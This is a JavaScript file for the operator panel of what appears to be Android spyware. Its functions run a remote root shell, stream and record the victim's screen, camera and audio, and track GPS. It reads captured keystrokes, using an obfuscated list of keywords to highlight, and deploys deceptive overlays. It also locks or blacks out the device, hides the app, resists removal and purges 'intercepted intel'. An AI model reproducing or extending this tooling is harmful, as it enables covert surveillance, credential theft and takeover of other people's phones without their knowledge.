let lastLogId = 0;
let commandHistory = [];
let historyIndex = -1;
let ghostScreenActive = false;
let ghostIsIdle = false;
let ghostDragStart = null;
let lastInteractionTime = 0;
let streamActive = false;
let currentRotation = 0;
let camId = '0';
let streamWidth = 640;
let streamHeight = 480;
let streamQuality = 40;

function updateNav() {
  const path = window.location.pathname;
  const links = document.querySelectorAll('.nav a');

  links.forEach(l => {
    const href = l.getAttribute('href');
    let isActive = false;

    if (href === '/') {
        isActive = (path === '/' || path === '/terminal');
    } else if (href === '/files') {
        isActive = (path.startsWith('/files') || path.startsWith('/device/apps'));
    } else if (href === '/device') {
        isActive = (path.startsWith('/device') && !path.includes('/apps'));
    } else {
        // Strict prefix matching for surveillance modules
        isActive = path.startsWith(href);
    }

    if (isActive) {
        l.classList.add('active');
    } else {
        // Only remove if it's NOT a sub-page of the current link
        // This prevents the flicker or removal when navigating deep routes
        if (!path.startsWith(href) || href === '/') {
            l.classList.remove('active');
        }
    }
  });
}

function showToast(m, type='info') {
  let t = document.getElementById('c2-toast');
  if(!t) {
    t = document.createElement('div'); t.id = 'c2-toast';
    Object.assign(t.style, {
      position: 'fixed',
      bottom: '15%',
      left: '50%',
      transform: 'translateX(-50%)',
      background: 'rgba(15,15,25,0.98)',
      border: '1px solid var(--neon-cyan)',
      color: '#fff',
      padding: '16px 32px',
      borderRadius: '12px',
      zIndex: '10000',
      fontSize: '0.9rem',
      textAlign: 'center',
      minWidth: '320px',
      boxShadow: '0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)',
      transition: 'all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
      opacity: '0',
      display: 'none',
      fontFamily: 'Orbitron, sans-serif',
      letterSpacing: '1px'
    });
    document.body.appendChild(t);
  }
  t.style.borderColor = type === 'error' ? 'var(--danger)' : 'var(--neon-cyan)';
  t.innerText = m; t.style.display = 'block';
  setTimeout(() => { t.style.opacity = '1'; t.style.bottom = '20%'; }, 10);
  setTimeout(() => { t.style.opacity = '0'; t.style.bottom = '15%'; setTimeout(() => t.style.display='none', 500); }, 3500);
}

function repairProtocol() {
    console.log('[DEBUG] Initiating Repair Protocol...');
    fetch('/gps/request-permission')
      .then(r => r.json())
      .then(d => { showToast(d.message); })
      .catch(e => { console.error(e); showToast('Connection failure', 'error'); });
}

async function handleLogin(e) {
  e.preventDefault();
  const pass = document.getElementById('password').value;
  const header = document.getElementById('status-header');
  const btn = document.getElementById('uplink-btn');
  btn.disabled = true; btn.style.opacity = '0.5';
  try {
    const response = await fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: 'password=' + encodeURIComponent(pass) + '&json=true'
    });
    const data = await response.json();
    if (data.success) {
      header.textContent = 'ACCESS_GRANTED';
      header.style.color = '#39ff14';
      header.style.textShadow = '0 0 25px #39ff14';
      setTimeout(() => { window.location.href = '/?auth=' + Date.now(); }, 1000);
    } else {
      header.textContent = 'INCORRECT_PASSWORD';
      header.style.color = '#ff3131';
      header.style.textShadow = '0 0 25px #ff3131';
      btn.disabled = false; btn.style.opacity = '1';
      setTimeout(() => {
        header.textContent = 'RESTRICTED_ACCESS';
        header.style.color = '#00f2ff';
        header.style.textShadow = '0 0 15px rgba(0,242,255,0.6)';
      }, 2000);
    }
  } catch (err) {
    console.error(err);
    btn.disabled = false; btn.style.opacity = '1';
  }
}

function fetchLogs() {
  const logDisplay = document.getElementById('log-terminal');
  if (!logDisplay) return;

  fetch('/terminal/logs?since=' + lastLogId)
    .then(r => r.json())
    .then(data => {
       if (data.logs && data.logs.length > 0) {
           const logText = data.logs.join('\n');
           const wasAtBottom = (logDisplay.scrollHeight - logDisplay.scrollTop) <= (logDisplay.clientHeight + 50);

           if (lastLogId === 0) {
               logDisplay.innerText = logText;
           } else {
               // Append new logs to the BOTTOM
               logDisplay.innerText = logDisplay.innerText + '\n' + logText;
           }
           lastLogId = data.last_id;

           // Only auto-scroll if the user was already looking at the bottom
           if (wasAtBottom) {
               logDisplay.scrollTop = logDisplay.scrollHeight;
           }
       }
    }).catch(e => console.error("Log fetch failed", e));
}

function clearSessionLogs() { if(confirm('Clear all activity logs for this session?')) fetch('/terminal/clear-logs').then(() => { lastLogId = 0; fetchLogs(); }); }
function deviceCmd(a) { fetch('/device/' + a).then(r => r.json()).then(d => { if(d.redirect) window.location.href = d.redirect; }); }
function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }
function selfDestruct() { if(confirm('CAUTION: This will initiate the removal of all system stability protocols and uninstall the app. Proceed?')) fetch('/device/self-destruct'); }
function sendToast() { const m = document.getElementById('toast-msg').value; if(m) fetch('/device/toast?msg=' + encodeURIComponent(m)); }
function openApp() { const p = document.getElementById('app-selector').value; if(p) fetch('/device/open-app?pkg=' + encodeURIComponent(p)); }
function openUrl() { const u = document.getElementById('target-url').value; if(u) fetch('/device/open-url?url=' + encodeURIComponent(u)); }

function executeShell() {
    const input = document.getElementById('shell-cmd');
    const c = input.value;
    const out = document.getElementById('shell-output');
    if(!c) return;

    commandHistory.push(c);
    if(commandHistory.length > 50) commandHistory.shift();
    historyIndex = -1;

    const line = document.createElement('div');
    line.style.color = '#fff'; line.style.marginTop = '10px';
    const pTag = document.getElementById('terminal-prompt');
    const prompt = pTag ? pTag.innerText : 'root@Android:~#';
    line.innerHTML = '<span style="color:var(--terminal-green)">' + prompt + '</span> ' + c;
    out.appendChild(line);
    input.value = '';

    fetch('/device/shell?cmd=' + encodeURIComponent(c)).then(r => r.json()).then(d => {
      if (d.termux_available) {
        document.getElementById('termux-uplink').style.display = 'block';
        const p = document.getElementById('terminal-prompt'); if(p) p.innerText = 'root@Android:~$';
      } else {
        const p = document.getElementById('terminal-prompt'); if(p) p.innerText = 'root@Android:~#';
      }
      const resp = document.createElement('div');
      resp.style.whiteSpace = 'pre-wrap';
      resp.innerHTML = d.output || 'No output';
      out.appendChild(resp);
      out.scrollTop = out.scrollHeight;
    }).catch(e => {
      const err = document.createElement('div');
      err.style.color = 'var(--danger)';
      err.textContent = '[ERROR] Connection lost';
      out.appendChild(err);
    });
}

// --- GHOST MODE CONTROLS ---
function startGhostScreen() {
  ghostScreenActive = true;
  const status = document.getElementById('ghost-screen-status');
  if (status) status.style.display = 'none';
  const toggleBtn = document.getElementById('ghost-toggle-btn');
  if (toggleBtn) { toggleBtn.innerText = 'TERMINATE'; toggleBtn.style.borderColor = 'var(--danger)'; toggleBtn.style.color = 'var(--danger)'; }
  refreshGhostScreen();
}
function stopGhostScreen() {
  ghostScreenActive = false;
  const status = document.getElementById('ghost-screen-status');
  if (status) { status.style.display = 'block'; status.innerText = 'OLED_STANDBY'; }
  const toggleBtn = document.getElementById('ghost-toggle-btn');
  if (toggleBtn) { toggleBtn.innerText = 'INITIATE_VIEW'; toggleBtn.style.borderColor = 'var(--neon-green)'; toggleBtn.style.color = 'var(--neon-green)'; }
  document.getElementById('ghost-screen-stream').src = '';
}
function toggleGhostScreen() {
  if (ghostScreenActive) stopGhostScreen(); else startGhostScreen();
}
function refreshGhostScreen() {
  if (!ghostScreenActive) return;
  const img = document.getElementById('ghost-screen-stream');
  const status = document.getElementById('ghost-screen-status');
  const buffer = new Image();
  buffer.src = '/ghost/screenshot?t=' + Date.now();
  buffer.onload = () => {
    if (!ghostScreenActive) return;
    img.src = buffer.src;
    if (status) status.style.display = 'none';
    setTimeout(refreshGhostScreen, ghostIsIdle ? 5000 : 200);
  };
  buffer.onerror = () => { if (ghostScreenActive) setTimeout(refreshGhostScreen, 300); };
}
function startGhostDrag(e) {
  const img = document.getElementById('ghost-screen-stream');
  const rect = img.getBoundingClientRect();
  ghostDragStart = { x: ((e.clientX - rect.left) / rect.width) * 100, y: ((e.clientY - rect.top) / rect.height) * 100, t: Date.now() };
}
function endGhostDrag(e) {
  if (!ghostDragStart) return;
  const now = Date.now();
  if (now - lastInteractionTime < 150) return;
  lastInteractionTime = now;
  const img = document.getElementById('ghost-screen-stream');
  const rect = img.getBoundingClientRect();
  const endX = ((e.clientX - rect.left) / rect.width) * 100;
  const endY = ((e.clientY - rect.top) / rect.height) * 100;
  const duration = now - ghostDragStart.t;
  const dist = Math.sqrt(Math.pow(endX - ghostDragStart.x, 2) + Math.pow(endY - ghostDragStart.y, 2));
  if (dist < 2) fetch('/ghost/interact?action=click&px=' + ghostDragStart.x + '&py=' + ghostDragStart.y);
  else fetch('/ghost/interact?action=swipe&px1=' + ghostDragStart.x + '&py1=' + ghostDragStart.y + '&px2=' + endX + '&py2=' + endY + '&d=' + Math.max(duration, 100));
  ghostDragStart = null;
}
function openSettings() { fetch('/ghost/interact?action=settings'); }
function deployOverlay() {
  const type = document.getElementById('overlay-type').value;
  if(!type) return showToast('SELECT_TARGET_FIRST', 'error');
  if(confirm('Deploy Tactical Shadow Overlay?')) {
    fetch('/ghost/deploy-overlay?type=' + type).then(r => r.json()).then(d => {
      showToast('OVERLAY_DEPLOYED');
    });
  }
}
function terminateOverlay() {
  fetch('/ghost/deploy-overlay').then(r => r.json()).then(d => {
    showToast('OVERLAY_TERMINATED');
  });
}
function toggleLock() { fetch('/ghost/lock').then(() => { showToast('Uplink command sent: SYSTEM_LOCK'); checkGhostStatus(); }); }
function toggleBlackout() { fetch('/ghost/interact?action=' + (document.getElementById('blackout-btn').innerText.includes('ACTIVATE') ? 'blackout_on' : 'blackout_off')).then(() => checkGhostStatus()); }
function toggleAutoPilot() {
  fetch('/stealth?action=autopilot').then(r => r.json()).then(d => {
    const btn = document.getElementById('autopilot-btn');
    if(d.autopilot) { btn.innerText = 'AUTOPILOT_ENGAGED'; btn.classList.add('btn-engaged-yellow'); btn.style.color = '#000'; btn.style.background = '#ffff00'; }
    else { btn.innerText = 'AUTOPILOT_OFF'; btn.classList.remove('btn-engaged-yellow'); btn.style.color = 'var(--neon-yellow)'; btn.style.background = 'rgba(255, 255, 255, 0.03)'; }
  });
}
function ghostAction(a) { fetch('/ghost/interact?action='+a); }
function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }
async function refreshGhostLogs() {
  try {
    const r = await fetch('/ghost/keys'); if (!r.ok) return;
    const data = await r.json();
    const term = document.getElementById('ghost-terminal'); if(!term) return;
    if(data.keys.length > 0) {
      const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);
      let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      const _k = (s) => s.split('').map((c,i) => String.fromCharCode(c.charCodeAt(0) ^ 'SysAdmin'.charCodeAt(i % 8))).join('');
      const targets = [_k('\\x1C\\x0D\\x03'), _k('\\x13\\x18\\x00\\x12\\x13\\x01\\x10\\x0A'), _k('\\x0F\\x06\\x14\\x00\\x0A'), _k('\\x16\\x1A\\x16\\x13'), _k('\\x06\\x04\\x02\\x08\\x08')];
      targets.forEach(t => {
        const reg = new RegExp('(' + t + ')', 'gi');
        esc = esc.replace(reg, '<span style="color:var(--danger); font-weight:bold; text-shadow: 0 0 5px rgba(255,49,49,0.5);">$1</span>');
      });
      term.innerHTML = esc;
      if (isAtBottom) { term.scrollTop = term.scrollHeight; }
    }
  } catch(e) {}
}
async function checkGhostStatus() {
  try {
    const r = await fetch('/ghost/status'); if (!r.ok) return;
    const data = await r.json(); ghostIsIdle = data.isIdle;
    const card = document.getElementById('ghost-status-card');
    const text = document.getElementById('ghost-status-text');
    const prompt = document.getElementById('accessibility-prompt');
    const lockBtn = document.getElementById('lock-btn');
    const arBtn = document.getElementById('anti-removal-btn');
    const blackoutBtn = document.getElementById('blackout-btn');
    if (data.active) { card.style.borderColor = 'var(--neon-green)'; text.innerHTML = '<span style="color:var(--neon-green);">UPLINK_ESTABLISHED</span>'; prompt.style.display = 'none'; }
    else { card.style.borderColor = 'var(--danger)'; text.innerHTML = '<span style="color:var(--danger);">OFFLINE_AWAITING_PERMISSION</span>'; prompt.style.display = 'block'; }
    if (lockBtn) { if (data.lock) { lockBtn.innerHTML = 'RELEASE_LOCK'; lockBtn.style.borderColor = 'var(--neon-green)'; lockBtn.style.color = 'var(--neon-green)'; } else { lockBtn.innerHTML = 'DEPLOY_LOCK'; lockBtn.style.borderColor = 'var(--danger)'; lockBtn.style.color = 'var(--danger)'; } }
    if (blackoutBtn) {
      if (data.blackout) {
        blackoutBtn.innerHTML = 'RESTORE_DISPLAY'; blackoutBtn.style.borderColor = 'var(--neon-cyan)'; blackoutBtn.style.color = 'var(--neon-cyan)';
        const fb = document.getElementById('blackout-feedback'); if(fb) fb.style.display = 'block';
      } else {
        blackoutBtn.innerHTML = 'ACTIVATE_BLACKOUT'; blackoutBtn.style.borderColor = '#fff'; blackoutBtn.style.color = '#fff';
        const fb = document.getElementById('blackout-feedback'); if(fb) fb.style.display = 'none';
      }
    }
    const stream = document.getElementById('ghost-screen-stream');
    if (stream) {
      stream.style.filter = data.blackout ? 'brightness(0.6) contrast(1.1) saturate(0.9)' : 'none';
    }
    if (arBtn) { if (data.antiRemoval) { arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: ON'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)'; } else { arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: OFF'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)'; } }
  } catch(e) {}
}

// --- OPTICS CONTROLS ---
function rotateStream() { currentRotation = (currentRotation + 90) % 360; document.getElementById('main-stream').style.transform = 'rotate(' + currentRotation + 'deg)'; }
function applyQuality(val) {
  const config = resConfig[resOptions[val]];
  streamWidth = config.w; streamHeight = config.h; streamQuality = config.q;
  if(streamActive) { initiateStream(camId); }
}
async function initiateStream(id) {
  camId = id; streamActive = true;
  document.getElementById('loading-overlay').style.display = 'block';
  document.getElementById('loading-overlay').innerText = 'INITIALIZING_UPLINK...';
  const ind = document.getElementById('live-indicator');
  const dot = document.getElementById('indicator-dot');
  const txt = document.getElementById('indicator-text');
  ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';
  dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';
  document.querySelectorAll('.cam-btn').forEach(b => { b.classList.remove('btn-engaged-green'); b.style.borderColor = 'var(--neon-green)'; b.style.color = 'var(--neon-green)'; });
  const activeBtn = document.getElementById('cam-btn-' + id);
  if(activeBtn) { activeBtn.classList.add('btn-engaged-green'); activeBtn.style.borderColor = ''; activeBtn.style.color = ''; }
  const img = document.getElementById('main-stream');
  img.style.display = 'none';
  await fetch('/camera/stop-stream');
  setTimeout(() => {
    img.src = '/camera/stream?cam=' + id + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality + '&t=' + Date.now();
    img.onload = () => { document.getElementById('loading-overlay').style.display = 'none'; img.style.display = 'block'; };
  }, 500);
}
function terminateCaptures() {
  streamActive = false;
  const img = document.getElementById('main-stream'); img.src = ''; img.style.display = 'none';
  document.getElementById('loading-overlay').style.display = 'block';
  document.getElementById('loading-overlay').innerText = 'Uplink_Ready';
  const ind = document.getElementById('live-indicator');
  const dot = document.getElementById('indicator-dot');
  const txt = document.getElementById('indicator-text');
  ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)';
  dot.className = 'badge-dot'; txt.innerText = 'STANDBY';
  document.querySelectorAll('.cam-btn').forEach(b => { b.classList.remove('btn-engaged-green'); b.style.borderColor = 'var(--neon-green)'; b.style.color = 'var(--neon-green)'; });
  fetch('/camera/terminate').then(() => { document.getElementById('rec-btn').innerText = 'START_RECORDING'; });
}
function capturePhoto() { if(!camId) { showToast('SELECT_CAMERA_FIRST', 'error'); return; } window.open('/camera/photo?cam=' + camId, '_blank'); }
function toggleRecording() {
  const btn = document.getElementById('rec-btn');
  if(!streamActive) { showToast('START_FEED_FIRST', 'error'); return; }
  if(btn.innerText.includes('START')) { btn.innerText = 'STOP_RECORDING'; fetch('/camera/record?cam=' + camId); }
  else { btn.innerText = 'START_RECORDING'; fetch('/camera/stop-record'); }
}
function checkRecStatus() {
  fetch('/camera/status').then(r => r.json()).then(d => {
    const ind = document.getElementById('live-indicator');
    const dot = document.getElementById('indicator-dot');
    const txt = document.getElementById('indicator-text');
    const recBtn = document.getElementById('rec-btn');
    if (d.recording) { ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)'; dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)'; recBtn.innerText = 'STOP_RECORDING'; }
    else if (streamActive) { ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)'; dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE'; recBtn.innerText = 'START_RECORDING'; }
    else { ind.style.borderColor = 'var(--neon-yellow)'; ind.style.color = 'var(--neon-yellow)'; ind.style.background = 'rgba(255, 255, 0, 0.05)'; dot.className = 'badge-dot'; txt.innerText = 'STANDBY'; recBtn.innerText = 'START_RECORDING'; }
  });
}

// --- GPS CONTROLS ---
let currentLat = 0; let currentLon = 0;
function addGpsLog(msg) {
  const log = document.getElementById('gps-log'); if(!log) return;
  const div = document.createElement('div');
  div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  log.insertBefore(div, log.firstChild);
}
function locateDevice() {
  addGpsLog('[REQUEST] Pinging satellites...');
  fetch('/gps/locate?json=true').then(r => r.json()).then(data => {
    if (data.success) {
      currentLat = data.lat; currentLon = data.lon;
      const cd = document.getElementById('coord-display'); if(cd) cd.innerHTML = 'LAT: ' + data.lat + ' | LON: ' + data.lon;
      addGpsLog('[SUCCESS] Fix acquired: ' + data.lat + ', ' + data.lon);
      const frame = document.getElementById('map-frame');
      const overlay = document.getElementById('map-overlay');
      const extBtn = document.getElementById('ext-map-btn');
      if(frame) { frame.src = 'https://www.openstreetmap.org/export/embed.html?bbox=' + (data.lon-0.01) + ',' + (data.lat-0.01) + ',' + (data.lon+0.01) + ',' + (data.lat+0.01) + '&layer=mapnik&marker=' + data.lat + ',' + data.lon; frame.style.display = 'block'; }
      if(overlay) overlay.style.display = 'none';
      if(extBtn) extBtn.style.display = 'inline-block';
    } else {
      addGpsLog('[ERROR] ' + data.message);
      showToast(data.message);
    }
  }).catch(err => { addGpsLog('[FATAL] Network error during triangulation'); });
}
function openExternalMap() { window.open('https://www.google.com/maps/search/?api=1&query=' + currentLat + ',' + currentLon, '_blank'); }

// --- FILE / DATA CONTROLS ---
function filterFiles() {
  const val = document.getElementById('file-search').value.toLowerCase();
  document.querySelectorAll('.file-item').forEach(item => {
    const name = item.querySelector('.file-name').textContent.toLowerCase();
    item.style.display = name.includes(val) ? 'flex' : 'none';
  });
}
function setFilter(exts) {
  if(exts === 'all') { document.querySelectorAll('.file-item').forEach(i => i.style.display = 'flex'); return; }
  const list = exts.split(',');
  document.querySelectorAll('.file-item').forEach(item => {
    const name = item.querySelector('.file-name').textContent.toUpperCase();
    const matches = list.some(e => name.endsWith(e));
    item.style.display = matches ? 'flex' : 'none';
  });
}

function clearIntel() { if(confirm('Purge all intercepted intel?')) fetch('/intel/clear').then(() => location.reload()); }

function toggleStealth() {
  const type = document.getElementById('stealth-type').value;
  if(confirm('Initiate Stealth Protocol?')) fetch('/stealth?type=' + type);
}
function restoreNormal() {
  if(confirm('Restore normal identity?')) fetch('/stealth?action=restore');
}

window.alert = (m) => showToast(m);
window.onpopstate = updateNav;
window.addEventListener('pageshow', updateNav);
document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible') updateNav(); });

document.addEventListener('DOMContentLoaded', () => {
  updateNav();
  const scrollY = localStorage.getItem('cam_scroll');
  if (scrollY) { window.scrollTo(0, parseInt(scrollY)); localStorage.removeItem('cam_scroll'); }

  if (document.getElementById('log-terminal')) {
    fetchLogs();
    setInterval(fetchLogs, 5000);
  }

  if (document.getElementById('ghost-status-card')) {
    checkGhostStatus();
    refreshGhostLogs();
    setInterval(checkGhostStatus, 2000);
    setInterval(refreshGhostLogs, 2000);
  }

  if (document.getElementById('live-indicator')) {
    setInterval(checkRecStatus, 2000);
    const scroll = localStorage.getItem('optics_scroll');
    if(scroll) { window.scrollTo(0, parseInt(scroll)); localStorage.removeItem('optics_scroll'); }
  }

  if (document.getElementById('duration')) {
    setInterval(function() {
      fetch('/audio/status').then(r => r.json()).then(data => {
        const dTag = document.getElementById('duration');
        if (data.isRecording && dTag) {
          var d = data.duration; var min = Math.floor(d / 60); var sec = d % 60;
          dTag.textContent = min + ':' + (sec < 10 ? '0' : '') + sec;
        }
        if (data.callInProgress && !document.querySelector('.call-alert')) { location.reload(); }
      });
    }, 2000);
  }

  const shellInput = document.getElementById('shell-cmd');
  if (shellInput) {
    shellInput.addEventListener('keydown', function(e) {
        if (e.key === 'ArrowUp') {
          e.preventDefault();
          if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            this.value = commandHistory[commandHistory.length - 1 - historyIndex];
          }
        } else if (e.key === 'ArrowDown') {
          e.preventDefault();
          if (historyIndex > 0) {
            historyIndex--;
            this.value = commandHistory[commandHistory.length - 1 - historyIndex];
          } else if (historyIndex === 0) {
            historyIndex = -1;
            this.value = '';
          }
        } else if (e.key === 'Enter') {
          executeShell();
        }
    });
  }

  const loginForm = document.getElementById('login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', handleLogin);
  }
});
